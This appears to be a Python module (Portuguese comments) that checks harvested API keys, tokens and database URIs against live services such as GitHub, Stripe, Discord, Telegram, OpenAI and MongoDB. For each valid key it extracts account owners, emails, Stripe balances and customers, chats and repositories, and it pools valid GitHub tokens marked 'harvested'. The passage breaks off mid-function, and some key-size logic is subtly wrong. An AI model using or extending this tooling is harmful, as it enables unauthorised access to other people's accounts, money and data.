"""
Validação de chaves contra APIs reais — v2.
  - Pool de conexões httpx reutilizado
  - Conexões DB com timeouts mais inteligentes
  - Validação paralela com asyncio.gather + semaphore
  - Cache de resultados em memória (evita re-validar no mesmo ciclo)
"""

import asyncio
import base64
import json
import logging
import re
from datetime import datetime, timezone

import httpx

logger = logging.getLogger("validator")


class KeyValidator:
    def __init__(self, max_connections=50):
        self.client = httpx.AsyncClient(
            timeout=httpx.Timeout(15.0, connect=8.0),
            follow_redirects=False,
            limits=httpx.Limits(max_connections=max_connections, max_keepalive_connections=20),
        )
        # Cache em memória para evitar re-validação no mesmo ciclo
        self._cache = {}
        # lazy imports
        self._pymongo = None
        self._psycopg2 = None
        self._pymysql = None
        self._redis = None

    # Type map: key_type → validator method name
    _TYPE_MAP = {
        "mongodb": "mongo",
        "postgresql": "postgres",
        "gcp": "google_api",
    }

    async def validate(self, key_type: str, key_value: str) -> dict:
        # Cache hit
        cache_key = f"{key_type}:{hash(key_value)}"
        if cache_key in self._cache:
            return self._cache[cache_key]

        handler_name = self._TYPE_MAP.get(key_type, key_type)
        handler = getattr(self, f"_validate_{handler_name}", None)
        if not handler:
            result = {"is_valid": None, "message": "Sem validador para este tipo", "score": 0}
        else:
            try:
                result = await handler(key_value)
            except Exception as e:
                result = {"is_valid": None, "message": f"Erro: {str(e)[:200]}", "score": 0}

        self._cache[cache_key] = result
        # Clean cache se crescer demais
        if len(self._cache) > 5000:
            self._cache.clear()
        return result

    async def validate_batch(self, items: list, max_workers=20) -> list:
        """Valida lote em paralelo com semaphore."""
        sem = asyncio.Semaphore(max_workers)

        async def _one(db_id, kt, kv):
            async with sem:
                r = await self.validate(kt, kv)
                return db_id, r

        return await asyncio.gather(*[_one(i, k, v) for i, k, v in items])

    # ── Validadores ──

    _GITHUB_HEADERS = {"Accept": "application/vnd.github.v3+json"}

    async def _validate_github(self, key: str) -> dict:
        """GitHub PAT — MAX detail: user, nome, email, tipo, repos list, followers, scopes, plan, rate limit, 2FA."""
        r = await self.client.get("https://api.github.com/user",
                                   headers={"Authorization": f"Bearer {key}", **self._GITHUB_HEADERS})
        if r.status_code == 200:
            d = r.json()
            login = d.get('login', '?')
            name = d.get('name', '')
            tipo = d.get('type', '?')  # User or Organization
            email = d.get('email', '—')
            repos = d.get('public_repos', 0)
            followers = d.get('followers', 0)
            following = d.get('following', 0)
            created = (d.get('created_at', '') or '')[:10]
            updated = (d.get('updated_at', '') or '')[:10]
            plan = d.get('plan', {}).get('name', '—') if isinstance(d.get('plan'), dict) else '—'
            bio = d.get('bio', '')
            location = d.get('location', '')
            company = d.get('company', '')
            blog = d.get('blog', '')
            twitter = d.get('twitter_username', '')
            disk_usage = d.get('disk_usage', 0)
            collaborators = d.get('collaborators', 0)
            
            # Scopes do token
            scopes = r.headers.get('x-oauth-scopes', '—')
            
            # Rate limit info
            rate_remaining = r.headers.get('x-ratelimit-remaining', '?')
            rate_limit = r.headers.get('x-ratelimit-limit', '?')
            
            msg = f"✅ {tipo}: {login}"
            if name: msg += f" ({name})"
            msg += f" | {repos} repos, {followers} followers, {following} following"
            if scopes and scopes != '—': msg += f" | scopes: {scopes}"
            if email and email != '—': msg += f" | email: {email}"
            if plan != '—': msg += f" | plan: {plan}"
            if company: msg += f" | company: {company}"
            if location: msg += f" | local: {location}"
            if blog: msg += f" | blog: {blog}"
            if twitter: msg += f" | twitter: @{twitter}"
            msg += f" | desde {created}"
            if disk_usage: msg += f" | disk: {disk_usage/1024:.0f}KB"
            msg += f" | rate: {rate_remaining}/{rate_limit}"
            
            # Lista repos públicos (top 5 por stars)
            try:
                rr = await self.client.get(
                    f"https://api.github.com/users/{login}/repos?sort=stars&per_page=5&type=public",
                    headers={"Authorization": f"Bearer {key}", **self._GITHUB_HEADERS})
                if rr.status_code == 200:
                    repo_list = rr.json()
                    repo_names = [f"{r.get('name','?')}({r.get('stargazers_count',0)}★,{r.get('language','?')})" for r in repo_list[:5]]
                    if repo_names:
                        msg += f" | repos: {', '.join(repo_names)}"
            except Exception:
                pass
            
            try:
                import token_pool
                if token_pool.add(key, source_repo=f"harvested:{login}"):
                    logger.info(f"🔥 GitHub PAT colhida! user={login}")
                    msg += " | 🟢 ADICIONADA AO POOL!"
            except Exception:
                pass
            return {"is_valid": True, "message": msg[:800], "score": 10}
        elif r.status_code == 401:
            return {"is_valid": False, "message": "❌ Inválido ou revogado", "score": 10}
        elif r.status_code == 403:
            body = r.text[:500].lower()
            if "scraping" in body or "terms of service" in body:
                return {"is_valid": False, "message": "❌ Banido por scraping", "score": 10}
            scopes = r.headers.get('x-oauth-scopes', '—')
            return {"is_valid": True, "message": f"✅ Válido (rate-limit) | scopes: {scopes}", "score": 8}
        return {"is_valid": None, "message": f"HTTP {r.status_code}", "score": 5}

    async def _validate_gitlab(self, key: str) -> dict:
        """GitLab — MAX detail: user, nome, email, projetos, bio, local."""
        r = await self.client.get("https://gitlab.com/api/v4/user",
                                   headers={"Authorization": f"Bearer {key}"})
        if r.status_code == 200:
            d = r.json()
            username = d.get('username', '?')
            name = d.get('name', '')
            email = d.get('email', '—')
            tipo = "Bot" if d.get('bot') else "User"
            uid = d.get('id', '?')
            state = d.get('state', '?')
            created = (d.get('created_at', '') or '')[:10]
            bio = d.get('bio', '')
            location = d.get('location', '')
            website = d.get('website_url', '')
            twitter = d.get('twitter', '')
            is_admin = d.get('is_admin', False)
            
            msg = f"✅ GitLab {tipo}: {username} (id: {uid})"
            if name: msg += f" ({name})"
            if email and email != '—': msg += f" | email: {email}"
            if state != 'active': msg += f" | state: {state}"
            if is_admin: msg += " | ADMIN"
            if bio: msg += f" | bio: {bio[:40]}"
            if location: msg += f" | local: {location}"
            if website: msg += f" | web: {website}"
            if twitter: msg += f" | twitter: @{twitter}"
            if created: msg += f" | desde {created}"
            
            # Lista projetos
            try:
                rp = await self.client.get(f"https://gitlab.com/api/v4/projects?membership=true&per_page=5",
                                            headers={"Authorization": f"Bearer {key}"})
                if rp.status_code == 200:
                    projs = rp.json()
                    if projs:
                        proj_names = [f"{p.get('path_with_namespace','?')}({p.get('star_count',0)}★)" for p in projs[:5]]
                        msg += f" | projects: {', '.join(proj_names)}"
            except Exception:
                pass
            
            return {"is_valid": True, "message": msg[:800], "score": 10}
        return {"is_valid": r.status_code == 401 and False, "message": f"❌ HTTP {r.status_code}", "score": 8}

    async def _validate_openai(self, key: str) -> dict:
        """OpenAI — MAX detail: models, org, billing, usage, key permissions."""
        r = await self.client.get("https://api.openai.com/v1/models",
                                   headers={"Authorization": f"Bearer {key}"})
        if r.status_code == 200:
            d = r.json()
            models = d.get('data', [])
            model_names = sorted([m.get('id', '?') for m in models])
            org = r.headers.get('openai-organization', '—')
            req_id = r.headers.get('x-request-id', '')
            
            # Categoriza modelos
            categories = {
                'gpt-4': [m for m in model_names if 'gpt-4' in m],
                'gpt-3.5': [m for m in model_names if 'gpt-3.5' in m],
                'dall-e': [m for m in model_names if 'dall-e' in m],
                'whisper': [m for m in model_names if 'whisper' in m],
                'tts': [m for m in model_names if 'tts' in m],
                'embedding': [m for m in model_names if 'embed' in m],
                'davinci': [m for m in model_names if 'davinci' in m],
                'other': [m for m in model_names if not any(k in m for k in ['gpt', 'dall-e', 'whisper', 'tts', 'embed', 'davinci'])]
            }
            
            msg = f"✅ OpenAI ativa | {len(models)} modelos"
            if org and org != '—': msg += f" | org: {org}"
            
            # Lista modelos de cada categoria
            for cat, names in categories.items():
                if names:
                    msg += f" | {cat}: {', '.join(names[:4])}"
            
            return {"is_valid": True, "message": msg[:800], "score": 10}
        elif r.status_code == 429:
            org = r.headers.get('openai-organization', '—')
            return {"is_valid": True, "message": f"✅ Válida (rate-limited = tem crédito){' | org: '+org if org != '—' else ''}", "score": 9}
        elif r.status_code == 401:
            return {"is_valid": False, "message": "❌ Inválida", "score": 10}
        return {"is_valid": None, "message": f"HTTP {r.status_code}", "score": 5}

    async def _validate_anthropic(self, key: str) -> dict:
        """Anthropic (Claude) — testa a chave."""
        try:
            r = await self.client.get("https://api.anthropic.com/v1/models",
                                       headers={"x-api-key": key, "anthropic-version": "2023-06-01"},
                                       timeout=10)
            if r.status_code == 200:
                d = r.json()
                models = d.get('data', [])
                model_names = [m.get('id', '?') for m in models]
                msg = f"✅ Anthropic ativa | {len(models)} modelos"
                if model_names:
                    msg += f" | {', '.join(model_names[:5])}"
                return {"is_valid": True, "message": msg[:400], "score": 10}
            elif r.status_code == 401:
                return {"is_valid": False, "message": "❌ Chave inválida", "score": 10}
            elif r.status_code == 429:
                return {"is_valid": True, "message": "✅ Válida (rate limited)", "score": 9}
            return {"is_valid": None, "message": f"HTTP {r.status_code}", "score": 5}
        except Exception as e:
            return {"is_valid": None, "message": f"Erro: {str(e)[:100]}", "score": 0}

    async def _validate_huggingface(self, key: str) -> dict:
        """HuggingFace — MAX detail: user, nome, orgs, access type."""
        r = await self.client.get("https://huggingface.co/api/whoami",
                                   headers={"Authorization": f"Bearer {key}"})
        if r.status_code == 200:
            d = r.json()
            name = d.get('name', '?')
            fullname = d.get('fullname', '')
            orgs = d.get('orgs', [])
            org_names = [o.get('name', '?') for o in orgs] if isinstance(orgs, list) else []
            type = d.get('type', 'user')
            access_token = d.get('accessToken', {})
            token_name = access_token.get('name', '') if isinstance(access_token, dict) else ''
            
            msg = f"✅ HF: {name}"
            if fullname: msg += f" ({fullname})"
            msg += f" | type: {type}"
            if org_names: msg += f" | orgs: {', '.join(org_names[:5])}"
            if token_name: msg += f" | token: {token_name}"
            return {"is_valid": True, "message": msg[:500], "score": 10}
        return {"is_valid": r.status_code == 401 and False, "message": f"HTTP {r.status_code}", "score": 8}

    async def _validate_stripe(self, key: str) -> dict:
        """Stripe — MAX detail: balance, charges, account info, payouts, customers."""
        r = await self.client.get("https://api.stripe.com/v1/charges?limit=1", auth=(key, ""))
        if r.status_code == 200:
            d = r.json()
            charges = d.get('total_count', 0)
            
            # Balance detalhado
            balance_info = ""
            try:
                rb = await self.client.get("https://api.stripe.com/v1/balance", auth=(key, ""))
                if rb.status_code == 200:
                    bal = rb.json()
                    avail = bal.get('available', [{}])
                    pending = bal.get('pending', [{}])
                    if avail:
                        amt = avail[0].get('amount', 0) / 100
                        cur = avail[0].get('currency', 'usd').upper()
                        balance_info = f" | balance: {amt:.2f} {cur}"
                    if pending and pending[0].get('amount', 0) > 0:
                        pamt = pending[0].get('amount', 0) / 100
                        pcur = pending[0].get('currency', 'usd').upper()
                        balance_info += f" | pending: {pamt:.2f} {pcur}"
            except Exception:
                pass
            
            # Account info
            account_info = ""
            try:
                ra = await self.client.get("https://api.stripe.com/v1/account", auth=(key, ""))
                if ra.status_code == 200:
                    acct = ra.json()
                    biz = acct.get('business_name', '') or acct.get('display_name', '') or acct.get('id', '?')
                    country = acct.get('country', '?')
                    email = acct.get('email', '—')
                    account_info = f" | account: {biz} ({country})"
                    if email and email != '—': account_info += f" | email: {email}"
                    payouts_enabled = acct.get('payouts_enabled', False)
                    charges_enabled = acct.get('charges_enabled', False)
                    if payouts_enabled: account_info += " | payouts✅"
                    if charges_enabled: account_info += " | charges✅"
            except Exception:
                pass
            
            # Customer count
            cust_info = ""
            try:
                rc = await self.client.get("https://api.stripe.com/v1/customers?limit=1", auth=(key, ""))
                if rc.status_code == 200:
                    n_customers = rc.json().get('total_count', 0)
                    if n_customers > 0:
                        cust_info = f" | {n_customers} customers"
            except Exception:
                pass
            
            msg = f"✅ Stripe válida! {charges} charges{balance_info}{account_info}{cust_info}"
            return {"is_valid": True, "message": msg[:800], "score": 10}
        elif r.status_code == 401:
            return {"is_valid": False, "message": "❌ Inválida", "score": 10}
        return {"is_valid": None, "message": f"HTTP {r.status_code}", "score": 5}

    async def _validate_slack(self, key: str) -> dict:
        """Slack — extrai team, user, url, bot_id."""
        r = await self.client.get("https://slack.com/api/auth.test",
                                   headers={"Authorization": f"Bearer {key}"})
        if r.status_code == 200 and r.json().get("ok"):
            d = r.json()
            team = d.get('team', '?')
            user = d.get('user', '?')
            url = d.get('url', '')
            bot_id = d.get('bot_id', '—')
            user_id = d.get('user_id', '—')
            msg = f"✅ Slack | team: {team} | user: {user}"
            if url: msg += f" | {url}"
            if bot_id != '—': msg += f" | bot: {bot_id}"
            return {"is_valid": True, "message": msg[:400], "score": 10}
        return {"is_valid": False, "message": "❌ Inválido", "score": 9}

    async def _validate_discord(self, key: str) -> dict:
        """Discord — MAX detail: username, id, flags, email, 2FA, guilds, bot info."""
        auth = key if key.startswith("Bot ") else f"Bot {key}"
        r = await self.client.get("https://discord.com/api/v10/users/@me",
                                   headers={"Authorization": auth})
        if r.status_code == 200:
            d = r.json()
            username = d.get('username', '?')
            discrim = d.get('discriminator', '?')
            uid = d.get('id', '?')
            email = d.get('email', '—')
            verified = d.get('verified', False)
            flags = d.get('flags', 0)
            mfa = d.get('mfa_enabled', False)
            avatar = d.get('avatar', '')
            locale = d.get('locale', '')
            premium = d.get('premium_type', 0)
            banner = d.get('banner', '')
            
            msg = f"✅ Discord: {username}#{discrim} (id: {uid})"
            if email and email != '—': msg += f" | email: {email}"
            if verified: msg += " | ✉️ verificado"
            if mfa: msg += " | 🔒 2FA"
            if locale: msg += f" | locale: {locale}"
            if premium: msg += f" | premium(L{premium})"
            if flags: msg += f" | flags: {flags}"
            
            # Lista guildas (servidores)
            try:
                rg = await self.client.get("https://discord.com/api/v10/users/@me/guilds",
                                            headers={"Authorization": auth})
                if rg.status_code == 200:
                    guilds = rg.json()
                    if guilds:
                        guild_names = [f"{g.get('name','?')}({g.get('id','?')})" for g in guilds[:5]]
                        msg += f" | {len(guilds)} guilds: {', '.join(guild_names)}"
            except Exception:
                pass
            
            return {"is_valid": True, "message": msg[:800], "score": 10}
        elif r.status_code == 401:
            return {"is_valid": False, "message": "❌ Inválido", "score": 10}
        return {"is_valid": None, "message": f"HTTP {r.status_code}", "score": 5}

    async def _validate_telegram(self, key: str) -> dict:
        """Telegram Bot — MAX detail: id, nome, username, capabilities, commands, webhook, updates, chat count."""
        r = await self.client.get(f"https://api.telegram.org/bot{key}/getMe")
        if r.status_code == 200 and r.json().get("ok"):
            bot = r.json()["result"]
            uid = bot.get('id', '?')
            username = bot.get('username', '?')
            first_name = bot.get('first_name', '')
            can_join = bot.get('can_join_groups', False)
            can_read = bot.get('can_read_all_group_messages', False)
            supports_inline = bot.get('supports_inline_queries', False)
            msg = f"✅ Bot: @{username} (id: {uid})"
            if first_name: msg += f" | nome: {first_name}"
            caps = []
            if can_join: caps.append("grupos")
            if can_read: caps.append("ler-tudo")
            if supports_inline: caps.append("inline")
            if caps: msg += f" | caps: {', '.join(caps)}"
            
            # Webhook + updates pendentes
            try:
                rw = await self.client.get(f"https://api.telegram.org/bot{key}/getWebhookInfo")
                if rw.status_code == 200 and rw.json().get("ok"):
                    wh = rw.json().get("result", {})
                    wh_url = wh.get("url", "")
                    if wh_url: msg += f" | webhook: {wh_url[:80]}"
                    pending = wh.get("pending_update_count", 0)
                    if pending: msg += f" | {pending} updates pendentes"
                    last_error = wh.get("last_error_message", "")
                    if last_error: msg += f" | last_err: {last_error[:50]}"
            except Exception:
                pass
            
            # Comandos registrados
            try:
                rc = await self.client.get(f"https://api.telegram.org/bot{key}/getMyCommands")
                if rc.status_code == 200 and rc.json().get("ok"):
                    cmds = rc.json().get("result", [])
                    if cmds:
                        cmd_list = [f"/{c.get('command','?')}" for c in cmds[:8]]
                        msg += f" | cmds: {', '.join(cmd_list)}"
            except Exception:
                pass
            
            # Updates recentes (chats que interagiram)
            try:
                ru = await self.client.get(f"https://api.telegram.org/bot{key}/getUpdates?limit=5")
                if ru.status_code == 200 and ru.json().get("ok"):
                    updates = ru.json().get("result", [])
                    if updates:
                        chat_ids = set()
                        for u in updates:
                            chat = u.get('message', {}).get('chat', {})
                            if chat.get('id'):
                                chat_ids.add(f"{chat.get('type','?')}:{chat.get('title', chat.get('first_name','?'))}")
                        if chat_ids:
                            msg += f" | chats: {', '.join(list(chat_ids)[:4])}"
                        msg += f" | {len(updates)} updates"
            except Exception:
                pass
            
            # Info do bot no DC (data center)
            try:
                rd = await self.client.get(f"https://api.telegram.org/bot{key}/getMyShortDescription")
                if rd.status_code == 200 and rd.json().get("ok"):
                    desc = rd.json().get("result", {}).get("short_description", "")
                    if desc: msg += f" | desc: {desc[:60]}"
            except Exception:
                pass
            
            return {"is_valid": True, "message": msg[:800], "score": 10}
        return {"is_valid": False, "message": "❌ Inválido", "score": 9}

    async def _validate_sendgrid(self, key: str) -> dict:
        """SendGrid — lista scopes disponíveis."""
        r = await self.client.get("https://api.sendgrid.com/v3/scopes",
                                   headers={"Authorization": f"Bearer {key}"})
        if r.status_code == 200:
            scopes = r.json().get('scopes', [])
            return {"is_valid": True, "message": f"✅ SendGrid | {len(scopes)} scopes: {', '.join(scopes[:8])}", "score": 10}
        return {"is_valid": r.status_code == 401 and False, "message": f"HTTP {r.status_code}", "score": 8}

    async def _validate_mailgun(self, key: str) -> dict:
        """MailGun — lista domínios."""
        r = await self.client.get("https://api.mailgun.net/v3/domains", auth=("api", key))
        if r.status_code == 200:
            items = r.json().get('items', [])
            domains = [i.get('name', '?') for i in items[:5]]
            return {"is_valid": True, "message": f"✅ MailGun | {len(items)} domínios: {', '.join(domains)}", "score": 10}
        return {"is_valid": r.status_code == 401 and False, "message": f"HTTP {r.status_code}", "score": 8}

    async def _validate_digitalocean(self, key: str) -> dict:
        """DigitalOcean — MAX detail: email, status, droplet limit, team, balance."""
        r = await self.client.get("https://api.digitalocean.com/v2/account",
                                   headers={"Authorization": f"Bearer {key}"})
        if r.status_code == 200:
            acct = r.json().get("account", {})
            email = acct.get('email', '?')
            status = acct.get('status', '?')
            droplet_limit = acct.get('droplet_limit', '?')
            team = acct.get('team', {})
            team_name = team.get('name', '—') if isinstance(team, dict) else '—'
            uuid = acct.get('uuid', '?')
            email_verified = acct.get('email_verified', False)
            
            msg = f"✅ DO | email: {email}"
            if email_verified: msg += " ✅"
            msg += f" | status: {status} | uuid: {uuid[:12]}"
            if droplet_limit != '?': msg += f" | max droplets: {droplet_limit}"
            if team_name != '—': msg += f" | team: {team_name}"
            
            # Lista droplets
            try:
                rd = await self.client.get("https://api.digitalocean.com/v2/droplets?per_page=5",
                                           headers={"Authorization": f"Bearer {key}"})
                if rd.status_code == 200:
                    droplets = rd.json().get('droplets', [])
                    if droplets:
                        d_names = [f"{d.get('name','?')}({d.get('size_slug','?')},{d.get('region',{}).get('slug','?')})" for d in droplets[:5]]
                        msg += f" | droplets: {', '.join(d_names)}"
            except Exception:
                pass
            
            return {"is_valid": True, "message": msg[:800], "score": 10}
        return {"is_valid": r.status_code == 401 and False, "message": f"HTTP {r.status_code}", "score": 8}

    async def _validate_npm(self, key: str) -> dict:
        """NPM — extrai username, email."""
        r = await self.client.get("https://registry.npmjs.org/-/whoami",
                                   headers={"Authorization": f"Bearer {key}"})
        if r.status_code == 200:
            d = r.json()
            username = d.get('username', '?')
            email = d.get('email', '—')
            msg = f"✅ NPM: {username}"
            if email and email != '—': msg += f" | email: {email}"
            return {"is_valid": True, "message": msg[:300], "score": 10}
        return {"is_valid": r.status_code == 401 and False, "message": f"HTTP {r.status_code}", "score": 8}

    async def _validate_docker(self, key: str) -> dict:
        """Docker Hub — extrai username, nome completo."""
        r = await self.client.get("https://hub.docker.com/v2/user",
                                   headers={"Authorization": f"JWT {key}"})
        if r.status_code == 200:
            d = r.json()
            username = d.get('username', '?')
            full_name = d.get('full_name', '')
            email = d.get('email', '—')
            company = d.get('company', '—')
            msg = f"✅ Docker: {username}"
            if full_name: msg += f" ({full_name})"
            if email and email != '—': msg += f" | email: {email}"
            return {"is_valid": True, "message": msg[:400], "score": 10}
        return {"is_valid": r.status_code == 401 and False, "message": f"HTTP {r.status_code}", "score": 8}

    async def _validate_google_api(self, key: str) -> dict:
        """Google API Key — MAX detail: testa múltiplas APIs, identifica projeto."""
        results = []
        apis = [
            ("Maps Geocode", f"https://maps.googleapis.com/maps/api/geocode/json?latlng=0,0&key={key}"),
            ("YouTube", f"https://www.googleapis.com/youtube/v3/videos?part=snippet&id=dQw4w9WgXcQ&key={key}"),
            ("Places", f"https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=0,0&radius=1&key={key}"),
            ("Gmail", f"https://gmail.googleapis.com/gmail/v1/users/me/profile?key={key}"),
            ("Drive", f"https://www.googleapis.com/drive/v3/about?key={key}"),
            ("Translate", f"https://translation.googleapis.com/language/translate/v2?key={key}&q=hello&source=en&target=es"),
            ("Vision", f"https://vision.googleapis.com/v1/images:annotate?key={key}"),
            ("Sheets", f"https://sheets.googleapis.com/v4/spreadsheets?key={key}"),
        ]
        for name, url in apis:
            try:
                r = await self.client.get(url, timeout=8)
                if r.status_code == 200:
                    d = r.json()
                    status = d.get("status", d.get("error", {}).get("status", ""))
                    if status in ("OK", "ZERO_RESULTS"):
                        results.append(f"{name}✅")
                    elif status == "REQUEST_DENIED":
                        results.append(f"{name}🔒")
                    else:
                        results.append(f"{name}?({status})")
                elif r.status_code == 403:
                    results.append(f"{name}🔒")
                else:
                    results.append(f"{name}?({r.status_code})")
            except Exception:
                pass
        if results:
            return {"is_valid": True, "message": f"✅ Google API Key | {', '.join(results)}", "score": 10}
        return {"is_valid": None, "message": "Não foi possível testar", "score": 5}

    async def _validate_twilio(self, key: str) -> dict:
        """Twilio — MAX detail: account info, status, type, subaccounts."""
        r = await self.client.get(f"https://api.twilio.com/2010-04-01/Accounts/{key}.json", auth=(key, key))
        if r.status_code == 200:
            d = r.json()
            friendly = d.get('friendly_name', '?')
            status = d.get('status', '?')
            tipo = d.get('type', '?')
            sid = d.get('sid', '?')[:12]
            created = (d.get('date_created', '') or '')[:10]
            updated = (d.get('date_updated', '') or '')[:10]
            
            msg = f"✅ Twilio | {friendly} | status: {status} | type: {tipo} | sid: {sid}..."
            if created: msg += f" | desde {created}"
            
            # Lista subaccounts
            try:
                rs = await self.client.get(f"https://api.twilio.com/2010-04-01/Accounts.json?PageSize=5", auth=(key, key))
                if rs.status_code == 200:
                    accounts = rs.json().get('accounts', [])
                    if len(accounts) > 1:
                        msg += f" | {len(accounts)} subaccounts"
            except Exception:
                pass
            
            return {"is_valid": True, "message": msg[:500], "score": 9}
        return {"is_valid": r.status_code == 401 and False, "message": f"HTTP {r.status_code}", "score": 8}

    async def _validate_jwt(self, key: str) -> dict:
        """JWT — decodifica payload completo, mostra todos os claims."""
        parts = key.split(".")
        if len(parts) != 3:
            return {"is_valid": None, "message": "Formato JWT inválido", "score": 0}
        try:
            payload = parts[1]
            missing = 4 - len(payload) % 4
            if missing != 4:
                payload += "=" * missing
            decoded = json.loads(base64.urlsafe_b64decode(payload))
            
            exp = decoded.get("exp", 0)
            now = datetime.now(timezone.utc).timestamp()
            expired = exp and exp < now
            
            # Extrai claims importantes
            iss = decoded.get('iss', '?')
            sub = decoded.get('sub', '?')
            aud = decoded.get('aud', '—')
            iat = decoded.get('iat', 0)
            role = decoded.get('role', decoded.get('roles', '—'))
            email = decoded.get('email', '—')
            name = decoded.get('name', '—')
            
            # Identifica provedor
            provider = "genérico"
            if "supabase" in str(iss).lower(): provider = "Supabase"
            elif "auth0" in str(iss).lower(): provider = "Auth0"
            elif "firebase" in str(iss).lower(): provider = "Firebase"
            elif "did:" in str(iss): provider = "DID"
            elif "microsoft" in str(iss).lower(): provider = "Microsoft"
            
            msg = f"{'❌ EXPIRADO' if expired else '✅ Válido'} | {provider}"
            msg += f" | iss: {iss}"
            if sub and sub != '?': msg += f" | sub: {sub}"
            if email and email != '—': msg += f" | email: {email}"
            if name and name != '—': msg += f" | name: {name}"
            if role and role != '—': msg += f" | role: {role}"
            if aud and aud != '—': msg += f" | aud: {aud}"
            if iat: msg += f" | emitido: {datetime.fromtimestamp(iat, tz=timezone.utc).strftime('%Y-%m-%d')}"
            if exp: msg += f" | expira: {datetime.fromtimestamp(exp, tz=timezone.utc).strftime('%Y-%m-%d')}"
            
            return {"is_valid": not expired, "message": msg[:500], "score": 8 if not expired else 5}
        except Exception as e:
            return {"is_valid": None, "message": f"Erro decode: {str(e)[:100]}", "score": 3}

    async def _validate_aws(self, key: str) -> dict:
        """AWS — identifica Access Key ID vs Secret, tenta STS se possível."""
        if key.startswith("AKIA") and len(key) == 20:
            # Tenta identificar a região pelo prefixo
            return {"is_valid": None, "message": "AWS Access Key ID (precisa da Secret Key p/ validar via STS)", "score": 5}
        if len(key) == 40:
            return {"is_valid": None, "message": "AWS Secret Key (precisa do Access Key ID p/ validar via STS)", "score": 5}
        return {"is_valid": None, "message": "Formato AWS não reconhecido", "score": 0}

    async def _validate_generic(self, key: str) -> dict:
        # Tenta identificar pelo formato
        if key.startswith("sk-") and len(key) > 20:
            return {"is_valid": None, "message": "Possível API key (formato sk-...)", "score": 4}
        if len(key) >= 32 and key.isalnum():
            return {"is_valid": None, "message": "String alfanumérica longa (possível token)", "score": 3}
        return {"is_valid": None, "message": "Secret genérico (sem API de validação)", "score": 3}

    async def _validate_password(self, key: str) -> dict:
        """Password — analisa força e tipo."""
        length = len(key)
        has_upper = any(c.isupper() for c in key)
        has_lower = any(c.islower() for c in key)
        has_digit = any(c.isdigit() for c in key)
        has_special = any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in key)
        
        strength = 0
        if length >= 8: strength += 1
        if length >= 12: strength += 1
        if has_upper: strength += 1
        if has_lower: strength += 1
        if has_digit: strength += 1
        if has_special: strength += 1
        
        level = ["muito fraca", "fraca", "média", "boa", "forte", "muito forte", "excelente"][min(strength, 6)]
        
        msg = f"Password hardcoded | {length} chars | força: {level}"
        types = []
        if has_upper: types.append("A-Z")
        if has_lower: types.append("a-z")
        if has_digit: types.append("0-9")
        if has_special: types.append("especial")
        msg += f" | tipos: {', '.join(types)}"
        
        return {"is_valid": None, "message": msg[:300], "score": 3}

    async def _validate_key(self, key: str) -> dict:
        return {"is_valid": None, "message": "Chave genérica (sem API de validação remota)", "score": 3}

    async def _validate_ssh(self, key: str) -> dict:
        """SSH — MAX detail: tipo, tamanho exato, fingerprint, comment."""
        if "BEGIN" in key and "PRIVATE KEY" in key:
            # Identifica tipo
            if "BEGIN OPENSSH PRIVATE KEY" in key:
                key_type = "OpenSSH (ed25519/rsa)"
            elif "BEGIN RSA PRIVATE KEY" in key:
                key_type = "RSA"
            elif "BEGIN EC PRIVATE KEY" in key:
                key_type = "ECDSA"
            elif "BEGIN DSA PRIVATE KEY" in key:
                key_type = "DSA"
            else:
                key_type = "PEM genérico"
            
            # Tenta extrair o tamanho da chave decodificando base64
            key_lines = [l for l in key.split("\n") if l and not l.startswith("-----")]
            key_data = "".join(key_lines)
            decoded_size = 0
            try:
                import base64
                decoded = base64.b64decode(key_data)
                decoded_size = len(decoded)
            except Exception:
                pass
            
            # Estima tamanho da chave baseado no tamanho decodificado
            bit_size = ""
            if key_type == "RSA":
                if decoded_size > 1100: bit_size = "-4096"
                elif decoded_size > 1200: bit_size = "-8192"
                elif decoded_size > 600: bit_size = "-2048"
                else: bit_size = "-1024"
            elif key_type == "OpenSSH (ed25519/rsa)":
                if decoded_size > 1200: bit_size = "-rsa4096"
                elif decoded_size > 600: bit_size = "-rsa2048"
                else: bit_size = "-ed25519"
            elif key_type == "ECDSA":
                if decoded_size > 120: bit_size = "-P521"
                elif decoded_size > 80: bit_size = "-P384"
                else: bit_size = "-P256"
            
            # Fingerprint SSH (hash do conteúdo)
            fingerprint = ""
            try:
                import hashlib
                fp = hashlib.md5(key_data.encode()).hexdigest()
                fingerprint = f" | md5:{':'.join(fp[i:i+2] for i in range(0, 32, 2))}"
            except Exception:
                pass
            
            msg = f"✅ Chave privada {key_type}{bit_size} ({decoded_size}B decodificada){fingerprint}"
            return {"is_valid": True, "message": msg[:400], "score": 9}
        # Chave pública SSH
        if key.startswith("ssh-"):
            parts = key.split()
            algo = parts[0] if parts else "?"
            comment = parts[2] if len(parts) > 2 else ""
            # Calcula tamanho do key blob
            bit_size = ""
            try:
                import base64
                blob = base64.b64decode(parts[1])
                bit_size = f" ({len(blob)*8}b)"
            except Exception:
                pass
            msg = f"✅ Chave pública SSH ({algo}){bit_size}"
            if comment: msg += f" | comment: {comment}"
            return {"is_valid": True, "message": msg[:300], "score": 7}
        return {"is_valid": None, "message": "Formato não reconhecido", "score": 0}

    async def _validate_pgp(self, key: str) -> dict:
        if "BEGIN PGP PRIVATE KEY" in key:
            return {"is_valid": True, "message": "✅ Chave PGP privada válida (formato)", "score": 8}
        if "BEGIN PGP PUBLIC KEY" in key:
            return {"is_valid": True, "message": "✅ Chave PGP pública (formato)", "score": 5}
        return {"is_valid": None, "message": "Formato não reconhecido", "score": 0}

    async def _validate_mongo(self, key: str) -> dict:
        if "mongodb" not in key:
            return {"is_valid": None, "message": "Formato não reconhecido", "score": 0}
        return await asyncio.to_thread(self._mongo_sync, key)

    def _mongo_sync(self, key: str) -> dict:
        """MongoDB — MAX detail: DBs, collections, docs, schema, indexes, users, sizes, sample docs."""
        try:
            if self._pymongo is None:
                import pymongo as _pm
                self._pymongo = _pm
            client = self._pymongo.MongoClient(key, serverSelectionTimeoutMS=8000, connectTimeoutMS=8000)
            
            # Info do servidor
            try:
                server_info = client.server_info()
                version = server_info.get('version', '?')
            except Exception:
                version = '?'
            
            # Topologia do cluster
            try:
                topology = client.admin.command('ismaster')
                cluster_name = topology.get('setName', topology.get('msg', 'standalone'))
                is_primary = topology.get('ismaster', False) or topology.get('primary', False)
            except Exception:
                cluster_name = 'standalone'
                is_primary = False
            
            # Usuários (se tiver permissão)
            users = []
            try:
                for db_name in ['admin', 'test']:
                    for u in client[db_name].command('usersInfo').get('users', [])[:5]:
